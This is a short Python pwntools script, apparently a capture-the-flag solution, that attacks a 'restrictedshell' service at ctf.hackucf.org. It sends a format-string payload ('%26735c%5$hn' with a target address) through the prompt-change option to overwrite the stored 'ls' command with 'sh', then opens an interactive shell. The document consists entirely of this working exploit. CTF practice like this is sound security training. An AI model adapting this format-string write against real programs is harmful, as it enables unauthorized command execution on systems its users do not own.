from pwn import *

def main():
    offset = 5
    cmd_ls = 0x08049C70
    #r = process("./restrictedshell")
    r = remote("ctf.hackucf.org",7007)

    # go to format string vuln
    r.sendline("prompt")
    r.recvuntil("Enter new prompt string: ")

    # change ls to sh
    p = ""
    p += p32(cmd_ls)
    p += "%26735c%5$hn"

    r.sendline(p)
    r.sendline("ls")

    r.interactive()


if __name__ == "__main__":
    main()
